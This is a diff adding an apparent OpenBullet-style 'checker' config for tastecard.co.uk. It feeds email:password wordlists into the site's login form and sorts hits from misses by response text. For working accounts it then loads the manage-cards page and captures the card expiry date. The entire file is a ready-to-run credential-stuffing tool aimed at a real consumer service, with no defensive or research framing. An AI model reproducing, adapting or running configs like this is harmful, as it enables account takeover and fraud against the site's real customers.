@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Tastecard",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-09-29T23:06:37.2509472+01:00",
+  "AdditionalInfo": "",
+  "Author": "c1sav",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Expires",
+      "VariableName": "Expires",
+      "Id": 2124064858
+    }
+  ],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.tastecard.co.uk/user/login" 
+  CONTENT "login%5Bemail%5D=<USER>&login%5Bpassword%5D=<PASS>&login%5Bremember%5D=Y&return_addr=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.tastecard.co.uk" 
+  HEADER "referer: https://www.tastecard.co.uk/user/login" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "/?user_login_successful=1" 
+  KEYCHAIN Failure OR 
+    KEY "You have not created an account" 
+    KEY "register using the button below " 
+    KEY "The following errors occurred:" 
+
+REQUEST GET "https://www.tastecard.co.uk/user/manage-cards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture PARSE "<SOURCE>" LR "<div><strong>Expires:</strong>" "</div>" -> CAP "Expires" 
+
+!PARSE "<SOURCE>" LR "" "" -> VAR "" 
+
